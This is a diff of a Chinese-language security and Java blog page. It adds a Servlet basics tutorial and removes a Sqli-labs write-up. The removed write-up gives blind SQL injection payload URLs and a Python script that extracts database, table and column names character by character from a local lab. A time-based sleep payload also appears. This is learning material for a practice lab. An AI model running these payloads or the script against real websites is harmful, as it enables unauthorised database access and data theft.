@@ -236,7 +236,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/jaca_web_JSP技术/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/09/java_Servlet基础/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="P0rZ9">
@@ -255,7 +255,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/11/19/jaca_web_JSP技术/" itemprop="url">基础知识 | JSP基础</a></h1>
+                <a class="post-title-link" href="/2018/12/09/java_Servlet基础/" itemprop="url">基础知识 | Java_Servlet 基础</a></h1>
         
 
         <div class="post-meta">
@@ -267,7 +267,332 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-19T08:15:41+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T08:15:41+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>最近在学习Java,完成学校给布置的Java_web实验,写一个简单论坛,实验内容还需要完善,简单记录下所学内容。</p>
+</blockquote>
+<h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><blockquote>
+<p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。使用 Servlet,可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p>
+</blockquote>
+<h3 id="Servlet的生命周期"><a href="#Servlet的生命周期" class="headerlink" title="Servlet的生命周期"></a>Servlet的生命周期</h3><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-12-03.17.54.18-image.png" alt="2018-12-03.17.54.18-image.png"></p>
+<p>1.初始化阶段            </p>
+<blockquote>
+<p>当客户端向Servlet容器发出请求要求访问Servlet时,Servlet容器首先会解析请求,检查内存是否已经存在该Servlet对象,如果有则直接使用该Servlet对象,如果没有就创建Servlet对象,然后通过调用init()方法实现Servlet的初始化工作,需要注意的是,在Servlet的整个生命周期内,它的init()方法只被调用一次。</p>
+</blockquote>
+<p>2.运行阶段</p>
+<blockquote>
+<p>这是生命周期最核心的阶段,Servlet容器为这个请求创建代表Http请求的ServletRequest对象和代表Http响应的ServletResponse对象,然后将他们作为参数传递给Servlet的service()方法。service()方法从ServletRequest对象中获取客户端传输过来的信息并处理该请求,通过ServletResponse对象生成响应结果。在Servlet的生命周期内,每收到一次访问请求,Servlet容器都会调用一次Servlet的service()方法,并且创建新的ServletRequest和ServletResponse对象,service()方法在Servlet的生命周期内会被调用多次。</p>
+</blockquote>
+<p>3.销毁阶段:</p>
+<blockquote>
+<p>当服务器关闭或Web应用被移除容器后,Servlet会随着Web应用的销毁而销毁,在销毁Servlet之前,Servlet容器会调用Servlet的destroy()方法,以便让Servlet对象释放他所占用的资源。在Servlet的整个生命周期中,destory()方法也只被调用一次。需要注意的是,Servlet对象一旦创建就会驻留在内存中等待客户端的访问,直到服务器关闭,或Web应用被移除容器时,Servlet对象才会销毁。</p>
+</blockquote>
+<hr>
+<p>配置Servlet:</p>
+<pre><code>1.注解配置:@WebServlet(&quot;/RequestMethodServlet&quot;)  //自动创建注解,不用手动配置  现在的主流      
+2.web.xml 配置
+</code></pre><h3 id="运行Servlet"><a href="#运行Servlet" class="headerlink" title="运行Servlet:"></a>运行Servlet:</h3><p>由于<code>HttpServlet</code>类在重写的<code>service()</code>方法中,为每一种HTTP请求方式都定义了<code>doXXX()</code>方法,因此,当定义的类继承<code>HttpServlet</code>时,只需要根据请求方式,重写对应的<code>doxxx()</code>方法即可,而不需要重写<code>service()</code>方法:<br>重写doget与dopost方法:</p>
+<pre><code>protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+    // TODO Auto-generated method stub
+    PrintWriter out = response.getWriter();
+    out.write(&quot;this is get method&quot;);
+
+}
+
+protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+    // TODO Auto-generated method stub
+    PrintWriter out = response.getWriter();
+    out.write(&quot;this is post method&quot;);
+}
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-12-03.17.31.50-image.png" alt="2018-12-03.17.31.50-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-12-03.17.31.05-image.png" alt="2018-12-03.17.31.05-image.png"></p>
+<p>如果GET与POST请求的处理方式一致,则可以在<code>doPost()</code>方法中直接调用<code>doGet()</code>方法：<code>this.doGet(request, response);</code>即可。    </p>
+<h3 id="ServletContext与ServletConfig接口"><a href="#ServletContext与ServletConfig接口" class="headerlink" title="ServletContext与ServletConfig接口"></a>ServletContext与ServletConfig接口</h3><h4 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h4><h5 id="1-获取WEB应用程序的初始化参数"><a href="#1-获取WEB应用程序的初始化参数" class="headerlink" title="1.获取WEB应用程序的初始化参数"></a>1.获取WEB应用程序的初始化参数</h5><p>在web.xml文件中,不仅可以配置Servlet的初始化信息,还可以配置WEB应用程序的初始化参数,web应用程序的初始化参数:</p>
+<pre><code>#web.xml
+&lt;context-param&gt;
+      &lt;param-name&gt;companyname&lt;/param-name&gt;
+      &lt;param-value&gt;itcast&lt;/param-value&gt;    
+  &lt;/context-param&gt;
+  &lt;context-param&gt;
+      &lt;param-name&gt;address&lt;/param-name&gt;
+      &lt;param-value&gt;beijing&lt;/param-value&gt;
+  &lt;/context-param&gt;
+</code></pre><p>Servlet中读取该配置信息:</p>
+<pre><code>PrintWriter out = response.getWriter();
+ServletContext context = (ServletContext) this.getServletContext();  //得到ServletContext对象
+Enumeration&lt;String&gt; paramNames = context.getInitParameterNames();     //得到可遍历的数组集合Enumeration对象
+out.println(&quot;there are param-name and param-value:&quot;);
+while(paramNames.hasMoreElements()) {                      //hasMoreElement方法,是否包含元素,有返回true
+    String name = paramNames.nextElement();
+    String value = context.getInitParameter(name);
+    out.println(name+&quot;:&quot;+value);
+
+}
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-07.08.58.33-image.png" alt="2018-12-07.08.58.33-image.png"></p>
+<h6 id="2-实现多个Servlet的对象共享数据"><a href="#2-实现多个Servlet的对象共享数据" class="headerlink" title="2.实现多个Servlet的对象共享数据"></a>2.实现多个Servlet的对象共享数据</h6><p>由于一个WEB应用中的所有Servlet共享同一个ServletContext对象,因此,ServletContext对象的域属性可以被该WEB应用中的所有Servlet访问</p>
+<pre><code>#TestServlet04
+javax.servlet.ServletContext context = this.getServletContext();
+context.setAttribute(&quot;data&quot;, &quot;this servlet save data&quot;);
+
+
+#TestServlet05
+PrintWriter out = response.getWriter();
+javax.servlet.ServletContext context = this.getServletContext();
+String data = (String) context.getAttribute(&quot;data&quot;);
+out.println(data);
+</code></pre><p>然后启动服务器,先访问TestServlet04将数据存入ServletContext对象,然后访问TestServlet05,即可得到ServletContext对象的data属性值<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-07.09.15.29-image.png" alt="2018-12-07.09.15.29-image.png"><br>说明ServletContext对象中的数据可以被多个Servlet访问。</p>
+<h5 id="3-读取WEB应用下的资源文件"><a href="#3-读取WEB应用下的资源文件" class="headerlink" title="3.读取WEB应用下的资源文件"></a>3.读取WEB应用下的资源文件</h5><p>在WebContent下面新建itcast.properties文件,写入:</p>
+<pre><code>Company = itcast
+Address = Beijing
+</code></pre><p>我们在Servlet中读取(相对路径):</p>
+<pre><code>#TestServlet06:
+ServletContext context = this.getServletContext();
+PrintWriter out = response.getWriter();
+
+//获取相对路径中的输入流对象
+InputStream in = context.getResourceAsStream(&quot;/itcast.properties&quot;);
+Properties pros = new Properties();
+pros.load(in);
+out.println(&quot;Company:&quot;+pros.getProperty(&quot;Company&quot;));
+out.println(&quot;address:&quot;+pros.getProperty(&quot;Address&quot;));
+</code></pre><p>根据绝对路径获取WEB应用的参数:</p>
+<pre><code>response.setContentType(&quot;text/html;charset=utf-8&quot;);
+ServletContext context = this.getServletContext();
+PrintWriter out = response.getWriter();
+
+String path = context.getRealPath(&quot;/itcast.properties&quot;); //得到绝对路径
+out.println(&quot;path:&quot;+path);
+FileInputStream in = new FileInputStream(path);
+
+Properties pros = new Properties();
+pros.load(in);
+out.println(&quot;Company:&quot;+pros.getProperty(&quot;Company&quot;));
+out.println(&quot;address:&quot;+pros.getProperty(&quot;Address&quot;));
+</code></pre><p>访问TestServlet06,可看到已经成功取出数据<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-07.10.21.31-image.png" alt="2018-12-07.10.21.31-image.png"></p>
+<p>ServletConfig   </p>
+<p>#####<br>当Tomcat初始化一个Servlet参数时,会将Servlet的配置信息封装到一个ServletConfig对象中,通过调用init(ServletConfig config)方法将ServletConfig对象传递给Servlet。    </p>
+<h3 id="HttpServletRequest与HttpServletResponse对象"><a href="#HttpServletRequest与HttpServletResponse对象" class="headerlink" title="HttpServletRequest与HttpServletResponse对象"></a>HttpServletRequest与HttpServletResponse对象</h3><blockquote>
+<p>Servlet 最主要的功能就是处理客户端请求,并向客户端做出响应。为此,针对Servlet的每次请求,Web服务器在调用service()之前,都会创建2个对象.分别是HttpServlet与HttpServletResponse。</p>
+</blockquote>
+<h4 id="HttpServletRequest对象"><a href="#HttpServletRequest对象" class="headerlink" title="HttpServletRequest对象"></a>HttpServletRequest对象</h4><h5 id="获取请求参数"><a href="#获取请求参数" class="headerlink" title="获取请求参数:"></a>获取请求参数:</h5><pre><code>获取前台form表单传输过来的参数信息:
+String username = request.getparameter(&quot;username&quot;);
+String pwd = request.getparameter(&quot;password&quot;);
+
+String[] hobbys = request.getparameter(&quot;hobby&quot;);
+for(int i=0;i&lt;hobbys.length();i++){
+    out.print(hobbys[i]);    
+}
+
+Enumeration names = request.getParameterNames()   //返回所有参数名    
+Map&lt;String,String[]&gt; map=request.getParameterMap();   //将请求参数与值放进一个Map对象中返回
+
+Map&lt;String,String[]&gt; map=request.getParameterMap();  
+     //遍历  
+      for(Iterator iter=map.entrySet().iterator();iter.hasNext();){  
+            Map.Entry element=(Map.Entry)iter.next();  
+            //key值  
+            Object strKey = element.getKey();  
+            //value,数组形式  
+          String[] value=(String[])element.getValue();  
+
+          out.print(strKey.toString() +&quot;=&quot;);  
+         for(int i=0;i&lt;value.length;i++){  
+             out.print(value[i]+&quot;,&quot;);  
+         }
+</code></pre><h5 id="获取请求消息头信息"><a href="#获取请求消息头信息" class="headerlink" title="获取请求消息头信息:"></a>获取请求消息头信息:</h5><pre><code>PrintWriter out = response.getWriter();
+
+Enumeration headerNames = request.getHeaderNames();         
+
+while(headerNames.hasMoreElements()) {
+    String paramName = (String)headerNames.nextElement();
+    String paramValue = request.getHeader(paramName);
+    out.print(paramName+&quot;:&quot;+paramValue);
+    out.print(&quot;&lt;br /&gt;&quot;);
+
+}
+</code></pre><p>先使用HttpServletRequest的getHeaderName()读取HTTP头信息,该方法返回一个枚举,包含与当前的HTTP请求相关的头信息,我们循环枚举,使用hasMoreElements()方法遍历即可。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-09.17.08.14-image.png" alt="2018-12-09.17.08.14-image.png"></p>
+<h5 id="通过Request对象传递数据"><a href="#通过Request对象传递数据" class="headerlink" title="通过Request对象传递数据"></a>通过Request对象传递数据</h5><blockquote>
+<p>Request对象不仅可以获取一系列数据,还可以使用属性传递数据,在ServletRequest接口中,定义了一系列操作属性的方法。</p>
+</blockquote>
+<p><code>request.setAttribute()</code>将一个对象与一个name关联存入<code>ServletRequest()</code>对象中,如果已经存在相同名字,则会删除原来的属性.如果设置对象值为<code>null</code>,则相当于<code>removeAttribute()</code></p>
+<pre><code>Servlet：
+request.setAttribute(&quot;list&quot;, list1);
+
+Jsp:
+&lt;jsp:include page=&apos;&lt;%=&quot;/ShowAllUser&quot; %&gt;&apos;&gt;&lt;/jsp:include&gt;
+${list}  即可在Jsp中接收list
+
+request.getAttribute(String name)  返回ServletRequest对象指定name的value    
+request.removeAttribute(String name)  删除ServletRequest对象指定name的value    
+request.getAttributeNames()    
+
+    request.setAttribute(&quot;name&quot;, &quot;zhangsan&quot;);
+    request.setAttribute(&quot;pwd&quot;, &quot;123&quot;);
+    Enumeration aa = request.getAttributeNames();
+
+    while(aa.hasMoreElements()) {
+        String name = (String) aa.nextElement();  //name
+        Object str = request.getAttribute(name);  //对象
+        out.print(name+&quot;:&quot;+str+&quot;&lt;br /&gt;&quot;);
+
+    }
+</code></pre><h5 id="RequestDispatcher接口"><a href="#RequestDispatcher接口" class="headerlink" title="RequestDispatcher接口"></a>RequestDispatcher接口</h5><p>当一个Web资源收到客户端的请求时,如果希望服务器通知另一个资源区处理请求,除了使用<code>response.sendRedirect()</code>,还可以使用RequestDispatcher接口实例化对象区实现。    </p>
+<h5 id="请求转发-forward"><a href="#请求转发-forward" class="headerlink" title="请求转发 forward()"></a>请求转发 forward()</h5><blockquote>
+<p>请求转发完给其他资源,其他WEB资源处理完请求后,直接将响应结果返回给客户端。(该方法需在提交给客户端之前调用,否则会出现错误)        </p>
+</blockquote>
+<pre><code>RequestDispatcher dispatcher = request.getRequestDispatcher(&quot;/TestServlet03&quot;);
+dispatcher.forward(request, response);   //返回TestServlet03的输出信息
+</code></pre><h5 id="请求包含-incule"><a href="#请求包含-incule" class="headerlink" title="请求包含 incule()"></a>请求包含 incule()</h5><blockquote>
+<p>请求包含指的是使用include()方法将Servlet请求转发到其他Web资源进行处理,与请求转发不同,Servlet与WEB资源都返回消息给客户端（关于编码,需在Servlet设置）</p>
+</blockquote>
+<pre><code>RequestDispatcher dispatcher = request.getRequestDispatcher(&quot;/TestServlet03&quot;);
+dispatcher.include(request, response);   //返回TestServlet02与TestServlet03的输出信息
+</code></pre><h4 id="HttpServletResponse对象"><a href="#HttpServletResponse对象" class="headerlink" title="HttpServletResponse对象"></a>HttpServletResponse对象</h4><p>a.setStatus(int status)方法    设置返回状态码(默认为200)<br>b.sendError(int sc)方法    用于发送表示错误信息的状态码。</p>
+<pre><code>public void sendError(int code) throws java.io.IOException  //只返回状态码
+public void sendError(int code,String message) throws java.io.IOException //返回加提示信息
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-09.16.50.22-image.png" alt="2018-12-09.16.50.22-image.png"><br>c.发送响应消息头相关的方法:</p>
+<pre><code>addHeader(String name,String value)   //增加同名响应头
+setHeader(String name,String value)   //覆盖同名响应头
+
+addIntHeader(String name,int value)   //设置valu值为int类型的参数,避免使用addHeader需要转换String的麻烦
+setIntHeader(String name,int value)    
+
+setContentLength(int len)   //设置响应消息的实体内容的大小
+setContentType(String type)  //设置Servlet输出内容的MIME类型
+
+setCharacterEncoding(String charset)   //设置输出内容使用的字符编码
+
+
+eg:response.setHeader(&quot;refresh&quot;,&quot;3;URL=http://www.baidu.com&quot;);  //定时刷新并跳转
+</code></pre><p>d.发送响应消息体相关的方法:</p>
+<pre><code>ServletOutputStream out = response.getOutputStream(); //输出字节数组中的二进制数据
+out.write(data.getBytes());               //使用当前文件的编码格式输出
+
+response.getWriter().write(data);   
+</code></pre><p>两者互相排斥,不可同时使用。(设计原因) 只能输出字节流或字符流。</p>
+<p>e.实现请求重定向:</p>
+<pre><code>response.sendRedirect(&quot;login.html&quot;);   //重定向到login.html
+</code></pre><h4 id="解决乱码问题"><a href="#解决乱码问题" class="headerlink" title="解决乱码问题"></a>解决乱码问题</h4><pre><code>request.setCharacterEncoding(&quot;UTF-8&quot;);   //使接收的参数值为utf-8格式
+response.setContentType(&quot;text/html;charset=utf-8&quot;);  //返回的信息为utf-8
+PrintWriter out = response.getWriter();   //在response.getWriter()前设置编码
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/java_web_JSP技术/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/19/java_web_JSP技术/" itemprop="url">Untitled</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-19T21:36:16+08:00">
                 2018-11-19
               </time>
             
@@ -307,7 +632,11 @@
       
         
           
-            <h2 id="JSP技术"><a href="#JSP技术" class="headerlink" title="JSP技术"></a>JSP技术</h2><h3 id="JSP基本语法"><a href="#JSP基本语法" class="headerlink" title="JSP基本语法"></a>JSP基本语法</h3><blockquote>
+            <hr>
+<p>title: 基础知识 | JSP基础<br>date: 2018-11-19 08:15:41<br>tags: JSP</p>
+<hr>
+<hr>
+<h2 id="JSP技术"><a href="#JSP技术" class="headerlink" title="JSP技术"></a>JSP技术</h2><h3 id="JSP基本语法"><a href="#JSP基本语法" class="headerlink" title="JSP基本语法"></a>JSP基本语法</h3><blockquote>
 <p>JSP = HTML + Java代码 + JSP标签<br>  Java代码:Java脚本 声明 表达式<br>  JSP标签:指令 动作 注释    </p>
 </blockquote>
 <h4 id="JSP脚本元素"><a href="#JSP脚本元素" class="headerlink" title="JSP脚本元素"></a>JSP脚本元素</h4><p>脚本元素主要包含3种类型:</p>
@@ -2653,363 +2982,6 @@ insert into user (content)VALUES(&apos;1&apos;^if(1,sleep(5),0))#
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/23/Sqli-labs_Blind_injection_Less5-6/" itemprop="url">Sqli-labs Blind injection Less5-6</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-23T08:15:41+08:00">
-                2018-10-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>在Sqli-labs项目中的第5、6关是盲注部分。我们知道盲注中,往往会遇到截取字符串的问题,这种情况下往往需要一个一个字符的去猜解,这里就总结几个过程中会用于截取字符串的函数及在Less5、6中的应用。</p>
-</blockquote>
-<hr>
-<p>##<strong>MID(源字符串,开始位置,截取长度)</strong><br>    str = ‘123456’  mid(str,2,1)结果为2 （下标从1开始）<br><strong>SQL用例</strong>：<br>A.<code>MID(DATABASE(),1,1)&gt;&#39;a&#39;</code>,查看数据库名第一位，<code>MID(DATABASE(),2,1)</code>查看数据库名第二位，依次查看各位字符。</p>
-<p>B.<code>MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1,1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
-<p>##<strong>substr(源字符串,开始位置,截取长度)</strong><br>substr与mid substring的用法类似<br>str = ‘123456’  substr(str,2,1)结果为2 （下标从1开始）<br><strong>SQL用例</strong>：<br>A.<code>substr(DATABASE(),1,1)&gt;&#39;a&#39;</code>,查看数据库名第一位,<code>MID(DATABASE(),2,1)</code>查看数据库名第二位,依次查看各位字符。</p>
-<p>B.<code>substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1,1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
-<p>##<strong>left(源字符串,截取长度)</strong><br>left得到字符串从左开始指定个数的字符串<br>str = ‘123456’  left(str,3) 结果为123<br><strong>SQL用例</strong>：<br>A.<code>left(database(),1)&gt;&#39;a&#39;</code>,查看数据库名第一位,<code>left(database(),2)&gt;&#39;ab&#39;</code>,查看数据库名前二位。</p>
-<p>B.<code>left((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
-<hr>
-<p>再介绍一<code>下ascii()</code>与<code>ord()</code>函数,这两个函数经常与上面的截取函数连用。<br>因为mysql默认是不对大小写敏感的,所以为了保证结果准确,我们就需要将字符转为其对应的ascii码值进行比较</p>
-<p>用法:<code>ASCII(str1) ord(str1)</code> 都是返回字符串的第一个字符的ASCII码值</p>
-<p><strong>SQL用例</strong>：</p>
-<pre><code>猜解数据库名第一位的ascii码值是否为97 (即字符a)
-ascii(substr(database(),1,1))=97 
-ord(mid(database(),1,1))=97  
-</code></pre><p>##<strong>Less-5:</strong><br>经过简单查看页面,这里的正确界面并不会返回用户名与密码,而是返回字符串<code>You are in.....</code><br><img src="http://static.zybuluo.com/chhyx/q6l3mejmpny13ckm3zjr7sue/image_1cqdfvqp21pi71ehd1kou7gs1kgtam.png" alt="image_1cqdfvqp21pi71ehd1kou7gs1kgtam.png-206.3kB"></p>
-<p>加单引号看报错信息:<br><img src="http://static.zybuluo.com/chhyx/1c8lqewwtouvcupqlga4at3v/image_1cqdfu64t2avelb1ugdlh61ssca9.png" alt="image_1cqdfu64t2avelb1ugdlh61ssca9.png-212.9kB"></p>
-<p>我们可以看到我们提交的1’经过sql语句处理变成<code>&#39;&#39;1&#39;&#39; LIMIT 0,1</code> 所以我们可以猜测后台代码是这样写的:<code>$sql=&quot;select * from users where id=&#39;$id&#39; limit 0,1&quot;</code><br>这里我们就需要闭合掉单引号</p>
-<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and 1=1--+
-http://127.0.0.1:86/less-5/index.php?id=1&apos; and 1=2--+
-</code></pre><p>这里正确会返回You are in…… 错误返回空</p>
-<p>那么基本可以确定这里是一处盲注了,下面笔者直接给出payload,如果有不熟悉的语句,可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/22/Sqli-labs_Less1-4/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/22/Sqli-labs_Less1-4/</a></p>
-<p>猜解数据库长度:</p>
-<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and length(database())&gt;7--+
-http://127.0.0.1:86/less-5/index.php?id=1&apos; and length(database())&gt;8--+
-</code></pre><p>说明数据库长度为8</p>
-<p>猜解数据库名:</p>
-<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and ascii(substr((database()),1,1))=115--+
-</code></pre><p>这里用burp简单测试一下,发现<code>ascii码</code>值为115返回正确页面, 猜解出第一位为s<br><img src="http://static.zybuluo.com/chhyx/2887km8ounik96ogys2wymx9/image_1cqfqlru4kvm10nj4vh16sl17c19.png" alt="image_1cqfqlru4kvm10nj4vh16sl17c19.png-63.9kB"><br>改变<code>substr</code>的第二个参数,至到数据库名全部猜解。（security）</p>
-<p>猜解数据表数量:</p>
-<pre><code>&apos; and (select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;)=4--+
-</code></pre><p>得到security数据库共有4张表<br>猜解每个表的长度:</p>
-<pre><code>&apos; and length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1))=6--+
-</code></pre><p>猜解数据表名:</p>
-<pre><code>&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))=97--+
-</code></pre><p>猜解列个数:</p>
-<pre><code>&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)=4--+
-</code></pre><p>猜解列长度:(改变substr的第二个参数进行猜解)</p>
-<pre><code>&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))--+
-</code></pre><p>猜解列名:</p>
-<pre><code>&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))=97--+
-</code></pre><p>然后就是猜解列中的数据了(这里以username列为例)</p>
-<p>猜解<code>username</code>列中的数据量:</p>
-<pre><code>&apos; and (select count(username) from security.users)=13--+;
-</code></pre><p>猜解<code>username</code>列第一条数据的长度:</p>
-<pre><code>&apos; and ascii(substr((select username from security.users limit 0,1),1,1))--+
-</code></pre><p>猜解<code>username</code>列第一条数据的长度</p>
-<pre><code>&apos; and ascii(substr((select username name from security.users limit 0,1),1,1))=97--+
-</code></pre><p>附完整python代码:</p>
-<pre><code># -*- coding: utf-8 -*-
-#author: P0rZ9
-#env: python2 
-#fun: Sqli-labs less5
-
-import requests
-import string
-
-url = &quot;http://127.0.0.1:86/less-5/index.php?id=1&quot;
-str1 = string.letters + string.digits + &quot;_!@#*&quot;
-
-database_name = &quot;&quot;
-table_num = 0
-table_list = []
-column_dic = {}
-column_list = []
-date_list = []
-
-#猜解数据库长度
-print &quot;开始猜解数据库长度......&quot;
-for i in range(30):
-    payload = &quot;&apos; and length(database())={}--+&quot;.format(str(i))
-    re = requests.get(url+payload)
-    #print url+payload
-    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
-        database_length = i
-        #print &apos;database_length:%d&apos;%(database_length)
-        break
-print &quot;数据库长度为%s&quot;%(database_length)
-#database_length：8
-
-#猜解数据库名
-print &quot;开始猜解数据库名......&quot;
-for i in range(1,database_length+1):
-    for chr in str1:
-        payload = &quot;&apos; and ascii(substr(database(),{},1))={}--+&quot;.format(str(i),ord(chr)) 
-        re = requests.get(url+payload)
-        #print url+payload
-        if &apos;You are in...........&apos; in re.text and re.status_code == 200:
-            database_name += chr
-            break
-        else:
-            pass
-print &quot;数据库名为%s&quot;%(database_name)
-#database_name：security
-
-#猜解数据表个数
-print &quot;开始猜解表的数量......&quot;
-for i in range(30):
-    payload = &quot;&apos; and (select count(table_name) from information_schema.tables where table_schema=&apos;%s&apos;)=%s--+&quot;%(database_name,str(i))
-    re = requests.get(url+payload)
-    #print url+payload
-    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
-        table_num = i
-        break
-    else:
-        pass
-print &quot;表的数量为:%s&quot;%(str(table_num))
-#table_num:4
-
-
-#表长度及名称
-#表长
-print &quot;开始猜解表名.......&quot;
-for i in range(table_num):
-    table_name = &quot;&quot;
-    for j in range(10):
-        payload = &quot;&apos; and length((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %s,1))=%s--+&quot;%(database_name,str(i),str(j))
-        re = requests.get(url+payload)
-        #print url+payload
-        if &apos;You are in...........&apos; in re.text and re.status_code == 200:
-            table_len = j
-            #print table_len
-
-            #表名
-            for k in range(table_len):#6
-                for chr in str1:
-                    payload = &quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %s,1),%s,1))=%s--+&quot;%(database_name,str(i),str(k+1),ord(chr))
-                    #print url+payload
-                    re = requests.get(url+payload)
-                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
-                        table_name += chr
-                        break
-            #print &quot;%s:%s位&quot;%(table_len,table_name)
-            table_list.append(table_name)
-            break
-print table_list
-#table_list = [&apos;uagents&apos;,&apos;referers&apos;,&apos;emails&apos;,&apos;users&apos;]
-
-
-#字段
-
-#猜解列的个数
-print &quot;开始猜解%s的列个数&quot;%(table_list[-1])
-for i in range(20):
-    payload = &quot;&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos;)=%s--+&quot;%(database_name,table_list[-1],str(i))
-    re = requests.get(url+payload)
-    #print url+payload
-    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
-        column_num = i
-        #print &quot;%s:%s个表&quot;%(table_list[-1],column_num)
-        column_dic.setdefault(table_list[-1],column_num)
-        break
-
-print &quot;%s的列个数为%s&quot;%(table_list[-1],column_dic[&apos;users&apos;])
-#column_dic:{&apos;users&apos;: 3}
-
-
-
-#猜解列的长度及列名
-print &quot;开始猜解%s的列名......&quot;%(table_list[-1])
-
